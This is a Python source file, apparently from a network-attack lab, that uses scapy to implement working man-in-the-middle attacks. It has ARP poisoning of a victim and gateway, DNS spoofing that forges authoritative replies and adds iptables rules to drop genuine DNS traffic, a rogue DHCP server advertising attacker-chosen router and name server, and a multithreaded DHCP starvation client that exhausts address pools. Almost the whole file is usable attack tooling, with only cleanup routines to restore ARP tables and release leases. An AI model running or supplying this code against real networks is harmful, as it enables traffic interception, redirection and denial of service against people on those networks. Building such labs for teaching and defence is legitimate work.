from __future__ import annotations

from dataclasses import dataclass
from ipaddress import ip_address
import random
from typing import Callable
import subprocess
import threading
import time

from scapy.all import ARP, BOOTP, DHCP, DNS, DNSQR, DNSRR, Ether, IP, UDP, send, sendp, sniff

from lab.network import BROADCAST_MAC, interface_mac, resolve_mac

def _normalize_fqdn(name: str) -> str:
    return name.rstrip(".").lower() + "."


def _decode_qname(qname: bytes | str) -> str:
    if isinstance(qname, bytes):
        return _normalize_fqdn(qname.decode("utf-8", errors="replace"))
    return _normalize_fqdn(qname)


@dataclass(frozen=True)
class ArpEndpoints:
    victim_ip: str
    victim_mac: str
    gateway_ip: str
    gateway_mac: str
    attacker_mac: str


@dataclass(frozen=True)
class DnsSpoofEvent:
    client_ip: str
    query_name: str
    answer_ip: str


@dataclass(frozen=True)
class RogueDhcpEvent:
    message_type: str
    client_mac: str
    offered_ip: str
    server_ip: str


@dataclass(frozen=True)
class DhcpStarvationLease:
    client_mac: str
    assigned_ip: str
    server_ip: str


@dataclass(frozen=True)
class DhcpStarvationEvent:
    message_type: str
    client_mac: str
    assigned_ip: str | None
    server_ip: str | None
    xid: int


class ArpPoisoner:
    def __init__(
        self,
        interface: str,
        victim_ip: str,
        gateway_ip: str,
        interval: float = 2.0,
    ) -> None:
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self._endpoints: ArpEndpoints | None = None

    def resolve_endpoints(self) -> ArpEndpoints:
        if self._endpoints is not None:
            return self._endpoints

        victim_mac = resolve_mac(self.victim_ip, self.interface)
        gateway_mac = resolve_mac(self.gateway_ip, self.interface)
        attacker_mac = interface_mac(self.interface)

        if not victim_mac:
            raise RuntimeError(f"Unable to resolve victim MAC for {self.victim_ip} on {self.interface}")
        if not gateway_mac:
            raise RuntimeError(f"Unable to resolve gateway MAC for {self.gateway_ip} on {self.interface}")

        self._endpoints = ArpEndpoints(
            victim_ip=self.victim_ip,
            victim_mac=victim_mac,
            gateway_ip=self.gateway_ip,
            gateway_mac=gateway_mac,
            attacker_mac=attacker_mac,
        )
        return self._endpoints

    def poison_once(self) -> None:
        endpoints = self.resolve_endpoints()

        victim_packet = Ether(dst=endpoints.victim_mac, src=endpoints.attacker_mac) / ARP(
            op=2,
            psrc=endpoints.gateway_ip,
            pdst=endpoints.victim_ip,
            hwsrc=endpoints.attacker_mac,
            hwdst=endpoints.victim_mac,
        )
        gateway_packet = Ether(dst=endpoints.gateway_mac, src=endpoints.attacker_mac) / ARP(
            op=2,
            psrc=endpoints.victim_ip,
            pdst=endpoints.gateway_ip,
            hwsrc=endpoints.attacker_mac,
            hwdst=endpoints.gateway_mac,
        )

        sendp(victim_packet, iface=self.interface, verbose=False)
        sendp(gateway_packet, iface=self.interface, verbose=False)

    def run(
        self,
        cycles: int | None = None,
        stop_requested: Callable[[], bool] | None = None,
        on_cycle: Callable[[int, ArpEndpoints], None] | None = None,
    ) -> None:
        sent = 0
        while cycles is None or sent < cycles:
            if stop_requested and stop_requested():
                break
            cycle_number = sent + 1
            if on_cycle:
                on_cycle(cycle_number, self.resolve_endpoints())
            self.poison_once()
            sent = cycle_number
            time.sleep(self.interval)

    def restore(self, count: int = 5) -> None:
        endpoints = self.resolve_endpoints()

        victim_restore = Ether(dst=endpoints.victim_mac, src=endpoints.gateway_mac) / ARP(
            op=2,
            psrc=endpoints.gateway_ip,
            pdst=endpoints.victim_ip,
            hwsrc=endpoints.gateway_mac,
            hwdst=endpoints.victim_mac,
        )
        gateway_restore = Ether(dst=endpoints.gateway_mac, src=endpoints.victim_mac) / ARP(
            op=2,
            psrc=endpoints.victim_ip,
            pdst=endpoints.gateway_ip,
            hwsrc=endpoints.victim_mac,
            hwdst=endpoints.gateway_mac,
        )
        victim_broadcast_restore = Ether(dst=BROADCAST_MAC, src=endpoints.gateway_mac) / ARP(
            op=2,
            psrc=endpoints.gateway_ip,
            pdst=endpoints.victim_ip,
            hwsrc=endpoints.gateway_mac,
            hwdst=BROADCAST_MAC,
        )
        gateway_broadcast_restore = Ether(dst=BROADCAST_MAC, src=endpoints.victim_mac) / ARP(
            op=2,
            psrc=endpoints.victim_ip,
            pdst=endpoints.gateway_ip,
            hwsrc=endpoints.victim_mac,
            hwdst=BROADCAST_MAC,
        )

        sendp(victim_restore, iface=self.interface, count=count, inter=0.2, verbose=False)
        sendp(gateway_restore, iface=self.interface, count=count, inter=0.2, verbose=False)
        sendp(victim_broadcast_restore, iface=self.interface, count=2, inter=0.2, verbose=False)
        sendp(gateway_broadcast_restore, iface=self.interface, count=2, inter=0.2, verbose=False)


class DnsSpoofer:
    def __init__(
        self,
        interface: str,
        records: dict[str, str],
        victim_ip: str | None = None,
        attacker_ip: str | None = None,
        gateway_ip: str | None = None,
        ttl: int = 60,
    ) -> None:
        self.interface = interface
        self.records = {_normalize_fqdn(domain): answer for domain, answer in records.items()}
        self.victim_ip = victim_ip
        self.attacker_ip = attacker_ip
        self.gateway_ip = gateway_ip
        self.ttl = ttl
        self._block_rules_installed = False

    def _lookup_answer(self, packet) -> str | None:
        if not packet.haslayer(DNSQR) or packet[DNS].qr != 0:
            return None
        if self.victim_ip and packet[IP].src != self.victim_ip:
            return None
        if self.attacker_ip and packet[IP].src == self.attacker_ip:
            return None

        qname = _decode_qname(packet[DNSQR].qname)
        return self.records.get(qname)

    def forge_response(self, packet, answer_ip: str):
        qname = packet[DNSQR].qname
        answer = DNSRR(rrname=qname, ttl=self.ttl, rdata=answer_ip)
        return (
            IP(src=packet[IP].dst, dst=packet[IP].src)
            / UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
            / DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=answer, ancount=1)
        )

    def handle_query(self, packet) -> DnsSpoofEvent | None:
        if not (packet.haslayer(IP) and packet.haslayer(UDP) and packet.haslayer(DNS) and packet.haslayer(DNSQR)):
            return None

        answer_ip = self._lookup_answer(packet)
        if not answer_ip:
            return None

        forged = self.forge_response(packet, answer_ip)
        send(forged, iface=self.interface, verbose=False)

        return DnsSpoofEvent(
            client_ip=packet[IP].src,
            query_name=_decode_qname(packet[DNSQR].qname),
            answer_ip=answer_ip,
        )

    def _iptables_rule_specs(self) -> list[list[str]]:
        if not self.victim_ip or not self.gateway_ip:
            return []

        return [
            [
                "iptables",
                "-I",
                "FORWARD",
                "-s",
                self.victim_ip,
                "-d",
                self.gateway_ip,
                "-p",
                "udp",
                "--dport",
                "53",
                "-j",
                "DROP",
            ],
            [
                "iptables",
                "-I",
                "FORWARD",
                "-s",
                self.gateway_ip,
                "-d",
                self.victim_ip,
                "-p",
                "udp",
                "--sport",
                "53",
                "-j",
                "DROP",
            ],
        ]

    def install_block_rules(self) -> None:
        if self._block_rules_installed:
            return

        for rule in self._iptables_rule_specs():
            subprocess.run(rule, check=False, capture_output=True, text=True)
        self._block_rules_installed = True

    def remove_block_rules(self) -> None:
        if not self._block_rules_installed:
            return

        for rule in self._iptables_rule_specs():
            delete_rule = rule.copy()
            delete_rule[1] = "-D"
            while True:
                result = subprocess.run(delete_rule, check=False, capture_output=True, text=True)
                if result.returncode != 0:
                    break
        self._block_rules_installed = False

    def run(
        self,
        packet_count: int = 0,
        on_spoof: Callable[[DnsSpoofEvent], None] | None = None,
        stop_requested: Callable[[], bool] | None = None,
    ) -> None:
        processed = 0

        def _handle(packet) -> None:
            nonlocal processed
            event = self.handle_query(packet)
            processed += 1
            if event and on_spoof:
                on_spoof(event)

        self.install_block_rules()
        try:
            while True:
                if stop_requested and stop_requested():
                    break
                if packet_count and processed >= packet_count:
                    break
                remaining = 0 if packet_count == 0 else packet_count - processed
                sniff(
                    iface=self.interface,
                    filter="udp dst port 53",
                    prn=_handle,
                    store=False,
                    count=remaining,
                    timeout=1,
                )
        finally:
            self.remove_block_rules()


class RogueDhcpServer:
    def __init__(
        self,
        interface: str,
        server_ip: str,
        offered_ip: str,
        victim_mac: str,
        gateway_ip: str,
        interval: float = 2.0,
        include_ack: bool = True,
    ) -> None:
        self.interface = interface
        self.server_ip = server_ip
        self.offered_ip = offered_ip
        self.victim_mac = victim_mac.lower()
        self.gateway_ip = gateway_ip
        self.interval = interval
        self.include_ack = include_ack
        self.attacker_mac = interface_mac(interface)

    def _bootp_chaddr(self) -> bytes:
        raw = bytes.fromhex(self.victim_mac.replace(":", ""))
        return raw + (b"\x00" * (16 - len(raw)))

    @staticmethod
    def _dhcp_options(packet) -> dict[str, str]:
        options: dict[str, str] = {}
        if not packet.haslayer(DHCP):
            return options
        for item in getattr(packet[DHCP], "options", []):
            if not isinstance(item, tuple) or len(item) != 2:
                continue
            key, value = item
            if isinstance(value, bytes):
                options[str(key)] = value.decode("utf-8", errors="replace")
            else:
                options[str(key)] = str(value)
        return options

    def _dhcp_packet(self, message_type: str, *, xid: int = 0):
        return (
            Ether(dst=BROADCAST_MAC, src=self.attacker_mac)
            / IP(src=self.server_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(
                op=2,
                xid=xid,
                yiaddr=self.offered_ip,
                siaddr=self.server_ip,
                giaddr="0.0.0.0",
                chaddr=self._bootp_chaddr(),
                flags=0x8000,
            )
            / DHCP(
                options=[
                    ("message-type", message_type),
                    ("server_id", self.server_ip),
                    ("lease_time", 60),
                    ("renewal_time", 30),
                    ("rebinding_time", 45),
                    ("subnet_mask", "255.255.255.0"),
                    ("router", self.gateway_ip),
                    ("name_server", self.server_ip),
                    "end",
                ]
            )
        )

    def emit_once(self, on_event: Callable[[RogueDhcpEvent], None] | None = None) -> None:
        offer = self._dhcp_packet("offer")
        sendp(offer, iface=self.interface, verbose=False)
        if on_event:
            on_event(
                RogueDhcpEvent(
                    message_type="offer",
                    client_mac=self.victim_mac,
                    offered_ip=self.offered_ip,
                    server_ip=self.server_ip,
                )
            )

        if self.include_ack:
            ack = self._dhcp_packet("ack")
            sendp(ack, iface=self.interface, verbose=False)
            if on_event:
                on_event(
                    RogueDhcpEvent(
                        message_type="ack",
                        client_mac=self.victim_mac,
                        offered_ip=self.offered_ip,
                        server_ip=self.server_ip,
                    )
                )

    def run(
        self,
        cycles: int | None = None,
        stop_requested: Callable[[], bool] | None = None,
        on_event: Callable[[RogueDhcpEvent], None] | None = None,
    ) -> None:
        sent = 0
        while cycles is None or sent < cycles:
            if stop_requested and stop_requested():
                break
            self.emit_once(on_event=on_event)
            sent += 1
            time.sleep(self.interval)

    def serve_requests(
        self,
        stop_requested: Callable[[], bool] | None = None,
        on_event: Callable[[RogueDhcpEvent], None] | None = None,
    ) -> None:
        victim_chaddr = self._bootp_chaddr()[:6]

        def handle(packet) -> None:
            if not packet.haslayer(BOOTP) or not packet.haslayer(DHCP):
                return
            bootp = packet[BOOTP]
            if bytes(getattr(bootp, "chaddr", b""))[:6] != victim_chaddr:
                return
            message_type = self._dhcp_options(packet).get("message-type", "").lower()
            numeric_map = {"1": "discover", "3": "request"}
            message_type = numeric_map.get(message_type, message_type)
            if message_type == "discover":
                reply_type = "offer"
            elif message_type == "request":
                reply_type = "ack"
            else:
                return
            xid = int(getattr(bootp, "xid", 0) or 0)
            sendp(self._dhcp_packet(reply_type, xid=xid), iface=self.interface, verbose=False)
            if on_event:
                on_event(
                    RogueDhcpEvent(
                        message_type=reply_type,
                        client_mac=self.victim_mac,
                        offered_ip=self.offered_ip,
                        server_ip=self.server_ip,
                    )
                )

        while not (stop_requested and stop_requested()):
            sniff(
                iface=self.interface,
                filter="udp and (port 67 or port 68)",
                store=False,
                timeout=1,
                prn=handle,
            )


class DhcpStarvationClient:
    def __init__(
        self,
        interface: str,
        server_ip: str,
        mac_prefix: str,
        interval: float = 0.2,
        request_timeout: float = 5.0,
        release_on_exit: bool = True,
        start_index: int = 1,
        worker_count: int = 4,
    ) -> None:
        self.interface = interface
        self.server_ip = server_ip
        self.mac_prefix = mac_prefix.lower()
        self.interval = interval
        self.request_timeout = request_timeout
        self.release_on_exit = release_on_exit
        self.start_index = start_index
        self.worker_count = max(1, worker_count)
        self.attacker_mac = interface_mac(interface)
        self._lease_index = start_index
        self._leases: dict[str, DhcpStarvationLease] = {}
        self._index_lock = threading.Lock()
        self._leases_lock = threading.Lock()

    def _client_mac(self, index: int) -> str:
        prefix = [part for part in self.mac_prefix.split(":") if part]
        if len(prefix) != 3:
            raise RuntimeError(f"Expected a 3-byte DHCP starvation MAC prefix, got {self.mac_prefix}")
        suffix = [f"{(index >> 16) & 0xFF:02x}", f"{(index >> 8) & 0xFF:02x}", f"{index & 0xFF:02x}"]
        return ":".join([*prefix, *suffix])

    @staticmethod
    def _bootp_chaddr(client_mac: str) -> bytes:
        raw = bytes.fromhex(client_mac.replace(":", ""))
        return raw + (b"\x00" * (16 - len(raw)))

    @staticmethod
    def _dhcp_options(packet) -> dict[str, str]:
        options: dict[str, str] = {}
        if not packet.haslayer(DHCP):
            return options
        for item in getattr(packet[DHCP], "options", []):
            if not isinstance(item, tuple) or len(item) != 2:
                continue
            key, value = item
            if isinstance(value, bytes):
                options[str(key)] = value.decode("utf-8", errors="replace")
            else:
                options[str(key)] = str(value)
        return options

    def _discover_packet(self, client_mac: str, xid: int, requested_ip: str | None = None):
        options = [
            ("message-type", "discover"),
            ("hostname", f"mitm-starve-{client_mac.replace(':', '')}"),
            ("vendor_class_id", "mitm-lab-starvation"),
            ("param_req_list", [1, 3, 6, 15, 51, 54]),
        ]
        if requested_ip:
            options.append(("requested_addr", requested_ip))
        options.append("end")
        return (
            Ether(dst=BROADCAST_MAC, src=client_mac)
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=68, dport=67)
            / BOOTP(op=1, xid=xid, chaddr=self._bootp_chaddr(client_mac), flags=0x8000)
            / DHCP(options=options)
        )

    def _request_packet(self, client_mac: str, xid: int, requested_ip: str, server_ip: str):
        return (
            Ether(dst=BROADCAST_MAC, src=client_mac)
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=68, dport=67)
            / BOOTP(op=1, xid=xid, chaddr=self._bootp_chaddr(client_mac), flags=0x8000)
            / DHCP(
                options=[
                    ("message-type", "request"),
                    ("requested_addr", requested_ip),
                    ("server_id", server_ip),
                    ("hostname", f"mitm-starve-{client_mac.replace(':', '')}"),
                    ("vendor_class_id", "mitm-lab-starvation"),
                    "end",
                ]
            )
        )

    def _release_packet(self, lease: DhcpStarvationLease, xid: int):
        return (
            Ether(dst=BROADCAST_MAC, src=lease.client_mac)
            / IP(src=lease.assigned_ip, dst=lease.server_ip)
            / UDP(sport=68, dport=67)
            / BOOTP(op=1, xid=xid, ciaddr=lease.assigned_ip, chaddr=self._bootp_chaddr(lease.client_mac))
            / DHCP(
                options=[
                    ("message-type", "release"),
                    ("server_id", lease.server_ip),
                    ("vendor_class_id", "mitm-lab-starvation"),
                    "end",
                ]
            )
        )

    def _wait_for_server_reply(
        self,
        xid: int,
        client_mac: str,
        expected_types: set[str],
    ):
        expected_chaddr = self._bootp_chaddr(client_mac)[:6]
        deadline = time.monotonic() + self.request_timeout

        while time.monotonic() < deadline:
            remaining = max(deadline - time.monotonic(), 0.1)
            packets = sniff(
                iface=self.interface,
                filter="udp and (port 67 or port 68)",
                store=True,
                count=1,
                timeout=remaining,
                lfilter=lambda packet: (
                    packet.haslayer(BOOTP)
                    and packet.haslayer(DHCP)
                    and packet[BOOTP].op == 2
                    and int(getattr(packet[BOOTP], "xid", -1)) == xid
                    and bytes(getattr(packet[BOOTP], "chaddr", b""))[:6] == expected_chaddr
                    and (
                        self._dhcp_options(packet).get("message-type", "").lower() in expected_types
                        or self._dhcp_options(packet).get("message-type", "") in {
                            "1", "2", "3", "4", "5", "6", "7", "8"
                        }
                    )
                ),
            )
            if packets:
                packet = packets[0]
                msg_type = self._dhcp_options(packet).get("message-type", "").lower()
                if msg_type in expected_types:
                    return packet
                numeric_map = {
                    "1": "discover",
                    "2": "offer",
                    "3": "request",
                    "4": "decline",
                    "5": "ack",
                    "6": "nak",
                    "7": "release",
                    "8": "inform",
                }
                if numeric_map.get(msg_type) in expected_types:
                    return packet
        return None

    def acquire_one(self, on_event: Callable[[DhcpStarvationEvent], None] | None = None) -> DhcpStarvationLease | None:
        with self._index_lock:
            client_mac = self._client_mac(self._lease_index)
            self._lease_index += 1
        xid = random.getrandbits(32)

        sendp(self._discover_packet(client_mac, xid), iface=self.interface, verbose=False)
        if on_event:
            on_event(DhcpStarvationEvent("discover", client_mac, None, self.server_ip, xid))

        offer = self._wait_for_server_reply(xid, client_mac, {"offer"})
        if offer is None:
            return None

        options = self._dhcp_options(offer)
        offered_ip = str(getattr(offer[BOOTP], "yiaddr", "") or "")
        server_ip = options.get("server_id") or str(getattr(offer[BOOTP], "siaddr", "") or "") or self.server_ip
        if not offered_ip or not server_ip:
            return None

        sendp(self._request_packet(client_mac, xid, offered_ip, server_ip), iface=self.interface, verbose=False)
        if on_event:
            on_event(DhcpStarvationEvent("request", client_mac, offered_ip, server_ip, xid))

        ack = self._wait_for_server_reply(xid, client_mac, {"ack"})
        if ack is None:
            return None

        assigned_ip = str(getattr(ack[BOOTP], "yiaddr", "") or offered_ip)
        lease = DhcpStarvationLease(client_mac=client_mac, assigned_ip=assigned_ip, server_ip=server_ip)
        with self._leases_lock:
            self._leases[client_mac] = lease
        if on_event:
            on_event(DhcpStarvationEvent("lease_acquired", client_mac, assigned_ip, server_ip, xid))
        return lease

    def rapid_request_once(
        self,
        requested_ip: str,
        on_event: Callable[[DhcpStarvationEvent], None] | None = None,
    ) -> None:
        with self._index_lock:
            client_mac = self._client_mac(self._lease_index)
            self._lease_index += 1
        xid = random.getrandbits(32)
        sendp(self._discover_packet(client_mac, xid, requested_ip=requested_ip), iface=self.interface, verbose=False)
        if on_event:
            on_event(DhcpStarvationEvent("discover", client_mac, requested_ip, self.server_ip, xid))
        time.sleep(0.02)
        sendp(self._request_packet(client_mac, xid, requested_ip, self.server_ip), iface=self.interface, verbose=False)
        if on_event:
            on_event(DhcpStarvationEvent("request", client_mac, requested_ip, self.server_ip, xid))

    def run_rapid_pool(
        self,
        pool_start: str,
        pool_end: str,
        passes: int = 0,
        stop_requested: Callable[[], bool] | None = None,
        on_event: Callable[[DhcpStarvationEvent], None] | None = None,
    ) -> None:
        start = int(ip_address(pool_start))
        end = int(ip_address(pool_end))
        if end < start:
            raise RuntimeError(f"Invalid DHCP pool range: {pool_start}..{pool_end}")
        pool = [str(ip_address(value)) for value in range(start, end + 1)]
        cursor = 0
        current_pass = 0
        cursor_lock = threading.Lock()

        def _next_ip() -> str | None:
            nonlocal cursor, current_pass
            with cursor_lock:
                if passes > 0 and current_pass >= passes:
                    return None
                requested_ip = pool[cursor]
                cursor += 1
                if cursor >= len(pool):
                    cursor = 0
                    current_pass += 1
                return requested_ip

        def _worker() -> None:
            while True:
                if stop_requested and stop_requested():
                    break
                requested_ip = _next_ip()
                if requested_ip is None:
                    break
                self.rapid_request_once(requested_ip, on_event=on_event)
                time.sleep(self.interval)

        workers = [
            threading.Thread(target=_worker, daemon=True, name=f"dhcp-rapid-starver-{index + 1}")
            for index in range(self.worker_count)
        ]
        for worker in workers:
            worker.start()
        for worker in workers:
            worker.join()

    def release_all(self, on_event: Callable[[DhcpStarvationEvent], None] | None = None) -> None:
        with self._leases_lock:
            leases = list(self._leases.values())
            self._leases.clear()
        for lease in leases:
            xid = random.getrandbits(32)
            sendp(self._release_packet(lease, xid), iface=self.interface, verbose=False)
            if on_event:
                on_event(DhcpStarvationEvent("release", lease.client_mac, lease.assigned_ip, lease.server_ip, xid))
            time.sleep(0.05)

    def run(
        self,
        cycles: int | None = None,
        stop_requested: Callable[[], bool] | None = None,
        on_event: Callable[[DhcpStarvationEvent], None] | None = None,
    ) -> None:
        completed = 0
        completed_lock = threading.Lock()

        def _worker() -> None:
            nonlocal completed
            while True:
                if stop_requested and stop_requested():
                    break
                with completed_lock:
                    if cycles is not None and completed >= cycles:
                        break
                lease = self.acquire_one(on_event=on_event)
                if lease is not None:
                    with completed_lock:
                        completed += 1
                time.sleep(self.interval)

        workers = [
            threading.Thread(target=_worker, daemon=True, name=f"dhcp-starver-{index + 1}")
            for index in range(self.worker_count)
        ]
        try:
            for worker in workers:
                worker.start()
            for worker in workers:
                worker.join()
        finally:
            if self.release_on_exit:
                self.release_all(on_event=on_event)
